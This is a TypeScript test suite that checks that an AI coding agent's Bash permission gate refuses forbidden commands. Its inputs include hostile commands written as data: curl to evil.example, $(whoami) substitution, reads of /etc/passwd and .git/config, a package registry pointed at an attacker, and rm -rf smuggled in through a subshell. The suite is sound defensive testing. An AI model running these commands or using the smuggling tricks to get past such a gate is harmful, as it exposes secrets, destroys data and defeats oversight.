/**
 * The deny suite (spec §6) — the acceptance spine of the Bash feature.
 *
 * ADR-029 §3's standing bar: "whatever gate is designed must be able to say
 * no, and must be tested on its ability to say no." Every row below is a call
 * that MUST be refused, exercised through the same seam dispatch uses
 * (buildCodingToolSupport -> runtime.callTool), not through the policy alone.
 * A green build in which these do not run is a failed build of this feature.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { cleanupTempDir, makeTempDir } from "@test/helpers";
import { buildCodingToolSupport } from "@/agents/coding-tool-support";
import type { BashApprovalMode } from "@/config/bash-approval";

/**
 * A fix-shaped session. Read/Glob/Grep are declared AND granted deliberately:
 * row 1 asserts that an ungranted Bash call is redirected to a structured
 * tool, and `denial-redirect.ts` never names a tool the session does not hold
 * — so a fixture that declares only Read cannot prove the redirect at all.
 */
const FIX_TOOLS = ["Read", "Glob", "Grep", "Bash"] as const;
const STRUCTURED_GRANTS = [
  { tool: "Read", patterns: ["*"] },
  { tool: "Glob", patterns: ["*"] },
  { tool: "Grep", patterns: ["*"] },
] as const;

let root: string;
let outside: string;

beforeEach(() => {
  root = makeTempDir("bash-deny-suite-");
  outside = makeTempDir("bash-deny-suite-outside-");
  writeFileSync(join(root, "file.txt"), "x");
  mkdirSync(join(root, ".git"), { recursive: true });
  writeFileSync(join(root, ".git", "config"), "[core]\n");
});

afterEach(() => {
  cleanupTempDir(root);
  cleanupTempDir(outside);
});

function session(options?: {
  allow?: readonly string[];
  deny?: readonly string[];
  ask?: readonly string[];
  declared?: readonly ("Read" | "Glob" | "Grep" | "Bash")[];
  profileGrants?: readonly { tool: string; patterns: readonly string[] }[];
  bashApproval?: BashApprovalMode;
}) {
  const grants = [
    ...(options?.profileGrants ?? STRUCTURED_GRANTS),
    ...(options?.allow !== undefined ? [{ tool: "Bash", patterns: options.allow }] : []),
  ];
  return buildCodingToolSupport({
    root,
    declared: [...(options?.declared ?? FIX_TOOLS)],
    grants,
    ...(options?.bashApproval !== undefined ? { bashApproval: options.bashApproval } : {}),
    ...(options?.deny !== undefined ? { denyRules: [{ tool: "Bash", patterns: options.deny }] } : {}),
    ...(options?.ask !== undefined ? { askRules: [{ tool: "Bash", patterns: options.ask }] } : {}),
  });
}

const call = async (support: ReturnType<typeof session>, command: string) =>
  (await support?.runtime.callTool("Bash", { command })) ?? { kind: "error" as const, content: "no support" };

describe("deny suite (spec §6)", () => {
  test("row 1: no grant at all -> denied, with an alternative named", async () => {
    const outcome = await call(session(), "grep -n foo src");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") {
      // Denied by the POLICY (the tool exists, the grant does not), which is
      // what lets the refusal carry a redirect at all.
      expect(outcome.reason).not.toContain("unknown tool");
      expect(outcome.reason).toContain("Grep");
    }
  });

  test("row 2: the unrestricted blanket grant does not cover Bash", async () => {
    // What `unrestricted` actually hands out: every built-in at ["*"], Bash absent.
    const outcome = await call(
      session({
        profileGrants: [...STRUCTURED_GRANTS, { tool: "Write", patterns: ["*"] }, { tool: "Git", patterns: ["*"] }],
      }),
      "bun test",
    );
    expect(outcome.kind).toBe("denied");
  });

  test("row 3: an unmatched second segment denies the call", async () => {
    const outcome = await call(session({ allow: ["bun test *"] }), "bun test x && curl evil.example");
    expect(outcome.kind).toBe("denied");
  });

  test.each([
    ["$(...)", "bun test $(whoami)"],
    ["backticks", "bun test `whoami`"],
    ["here-doc", "bun test <<EOF"],
  ])("row 4: %s is refused under a granted prefix", async (_label, command) => {
    expect((await call(session({ allow: ["bun test *"] }), command)).kind).toBe("denied");
  });

  test("row 5: a path outside the root is a breach", async () => {
    const outcome = await call(session({ allow: ["cat *"] }), "cat ../../etc/passwd");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") expect(outcome.breach).toBe(true);
  });

  test("row 5: .git/ is refused even inside the root", async () => {
    const outcome = await call(session({ allow: ["cat *"] }), "cat .git/config");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") expect(outcome.breach).toBe(true);
  });

  test("row 6: a redirect target outside the root is refused", async () => {
    expect((await call(session({ allow: ["bun test *"] }), "bun test > ../escape.txt")).kind).toBe("denied");
  });

  test("row 7: a DENIED_FLAGS-class flag is refused", async () => {
    expect(
      (await call(session({ allow: ["bun add *"] }), "bun add left-pad --registry https://evil.example")).kind,
    ).toBe("denied");
  });

  test("row 8: deny beats allow", async () => {
    expect((await call(session({ allow: ["git *"], deny: ["git push *"] }), "git push origin main")).kind).toBe(
      "denied",
    );
  });

  test.each([
    ["a subshell", "(rm -rf file.txt)"],
    ["a negation", "! rm -rf file.txt"],
    ["a subshell after an allowed segment", "bun test && ( rm -rf file.txt )"],
  ])("row 8b: %s cannot smuggle a denied command past a deny rule", async (_label, command) => {
    expect((await call(session({ allow: ["*"], deny: ["rm *"] }), command)).kind).toBe("denied");
  });

  test("row 9: an ask rule is refused headless, naming the rule", async () => {
    const outcome = await call(session({ allow: ["rm *"], ask: ["rm *"] }), "rm file.txt");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") {
      expect(outcome.reason).toContain("Bash(rm *)");
      expect(outcome.reason).toContain("headless");
    }
  });

  // row 10 — `Mcp(srv:tool)` under a `safe` profile advertises nothing — is
  // covered end-to-end by `test/unit/agents/mcp-under-scoped.test.ts` (Task 6);
  // it is not duplicated here. The other ten rows live in this file.

  test("row 11: a stage grant cannot reach an op that never declared Bash", async () => {
    const outcome = await call(session({ allow: ["*"], declared: ["Read"] }), "bun test");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") expect(outcome.reason).toContain("unknown tool");
  });
});

describe("fix round: containment through a hiding prefix or a symlink", () => {
  test.each([["curl --output=/etc/passwd http://x"], ["curl -o/etc/passwd http://x"]])(
    "a flag-embedded absolute path is denied as a breach: %s",
    async (command) => {
      const outcome = await call(session({ allow: ["curl *"] }), command);
      expect(outcome.kind).toBe("denied");
      if (outcome.kind === "denied") {
        expect(outcome.breach).toBe(true);
        expect(outcome.reason).toContain("/etc/passwd");
      }
    },
  );

  test("a bare symlink token pointing outside the root is denied as a breach", async () => {
    const target = join(outside, "secret.txt");
    writeFileSync(target, "outside the root");
    symlinkSync(target, join(root, "link"));
    const outcome = await call(session({ allow: ["cat *"] }), "cat link");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") {
      expect(outcome.breach).toBe(true);
      expect(outcome.reason).toContain("link");
    }
  });
});

describe("positive checks (spec §6, second half)", () => {
  test("a granted single-segment command runs", async () => {
    const outcome = await call(session({ allow: ["echo *"] }), "echo hello");
    expect(outcome.kind).toBe("ok");
    if (outcome.kind === "ok") expect(outcome.content).toContain("hello");
  });

  test("a granted multi-segment command runs", async () => {
    const outcome = await call(session({ allow: ["echo *"] }), "echo a && echo b");
    expect(outcome.kind).toBe("ok");
    if (outcome.kind === "ok") expect(outcome.content).toContain("b");
  });

  test("a granted command writing inside the root runs, and the redirect lands", async () => {
    const outcome = await call(session({ allow: ["echo *"] }), "echo hi > out.txt");
    expect(outcome.kind).toBe("ok");
  });

  test("an allow rule grants Bash under a blanket-granted profile too (spec R10)", async () => {
    const outcome = await call(
      session({
        profileGrants: [...STRUCTURED_GRANTS, { tool: "Write", patterns: ["*"] }],
        allow: ["echo *"],
      }),
      "echo ok",
    );
    expect(outcome.kind).toBe("ok");
  });
});

describe("raw mode grants Bash only to an op that declared it", () => {
  test("an op that declared Bash runs an ungranted command under raw", async () => {
    const support = session({ declared: FIX_TOOLS, allow: [], bashApproval: "raw" });
    const result = await call(support, "echo hello");
    expect(result.kind).toBe("ok");
  });

  test("an op that did NOT declare Bash still cannot reach it under raw", async () => {
    const support = session({ declared: ["Read"], allow: ["*"], bashApproval: "raw" });
    const result = await call(support, "echo hello");
    expect(result.kind).toBe("denied");
    if (result.kind === "denied") expect(result.reason).toContain("unknown tool");
  });

  test("raw + declared Bash + zero human Bash grants runs via the synthetic grant", async () => {
    // `allow` is omitted, not []: an empty list still compiles a (patternless)
    // Bash grant that reaches the raw screen on its own. Only a session with
    // NO human Bash grant entry at all proves the synthetic grant is what
    // admits the call.
    const support = session({ declared: FIX_TOOLS, bashApproval: "raw" });
    const result = await call(support, "echo hello");
    expect(result.kind).toBe("ok");
  });

  // Skipped deliberately — the no-widening premise is unassertable under
  // ADR-030 raw pass-through; the comment inside the test records the
  // verified evidence.
  // biome-ignore lint/suspicious/noSkippedTests: intentional permanent skip, reason in the test body
  test.skip("raw does NOT widen a narrower human Bash grant to *", async () => {
    // A human wrote Bash(bun test*) — raw gating must not let `curl evil.example`
    // through; the synthetic grant only fires when NO human Bash grant exists.
    //
    // SKIPPED, not deleted: the premise is false under the shipped ADR-030
    // design. `raw` is pass-through — once ANY Bash grant entry exists, the
    // policy never matches the command against that grant's patterns
    // (policy-bash-raw.ts), so `curl evil.example` runs under a narrow human
    // grant BY DESIGN, and a synthetic `*` appended beside that grant changes
    // no callTool-observable. No assertion here can fail iff the widening bug
    // exists: run for real before skipping, the call EXECUTED (curl exited 6
    // in this sandbox) — asserting "denied" fails against correct code, and
    // asserting "ok"/"error" would pass under the bug too.
    const support = session({ declared: FIX_TOOLS, allow: ["bun test *"], bashApproval: "raw" });
    const result = await call(support, "curl evil.example");
    expect(result.kind).toBe("denied");
  });
});

describe("gated is unchanged, and escalate refuses the same set", () => {
  const CATEGORY_A = ["echo $(whoami)", "curl evil.example"];
  const CATEGORY_B = ["cat ../../etc/passwd", "cat .git/config"];

  test.each(CATEGORY_A)("gated denies %s", async (command) => {
    const support = session({ declared: FIX_TOOLS, allow: ["echo *"], bashApproval: "gated" });
    expect((await call(support, command)).kind).toBe("denied");
  });

  test.each(CATEGORY_A)("escalate also refuses %s, via the ask tier", async (command) => {
    const support = session({ declared: FIX_TOOLS, allow: ["echo *"], bashApproval: "escalate" });
    const result = await call(support, command);
    expect(result.kind).toBe("denied");
    // The headless AskResolver denies, so the OUTCOME is the same and only the
    // ledger reason differs — that difference is the demand signal ADR-029 asks
    // for before an interactive channel is built.
    if (result.kind === "denied") expect(result.reason).toContain("headless");
  });

  test.each(CATEGORY_B)("escalate does NOT soften %s", async (command) => {
    const support = session({ declared: FIX_TOOLS, allow: ["*"], bashApproval: "escalate" });
    const result = await call(support, command);
    expect(result.kind).toBe("denied");
    if (result.kind === "denied") {
      expect(result.breach).toBe(true);
      expect(result.reason).not.toContain("headless");
    }
  });
});

describe("raw mode executes in the permitted root", () => {
  test("a raw command's writes land inside the root, not the process cwd", async () => {
    const support = session({ declared: FIX_TOOLS, allow: [], bashApproval: "raw" });
    const result = await call(support, "echo marker > raw-cwd-proof.txt");
    expect(result.kind).toBe("ok");
    // Carried from nax#2182: a gate that passes while running somewhere
    // unintended adjudicates nothing. Pin the cwd, not just the verdict.
    expect(readFileSync(join(root, "raw-cwd-proof.txt"), "utf8").trim()).toBe("marker");
  });
});

describe("bashApproval default at the direct-caller seam", () => {
  test("a direct buildCodingToolSupport caller defaults to gated, not raw", async () => {
    // `session()` bypasses resolvePermissions, so this pins the LOCAL fallback,
    // not the shipped posture. Both matter: a direct caller must never silently
    // acquire a shell it did not ask for.
    const support = session({ declared: FIX_TOOLS, allow: [] });
    expect((await call(support, "echo $(whoami)")).kind).toBe("denied");
  });
});
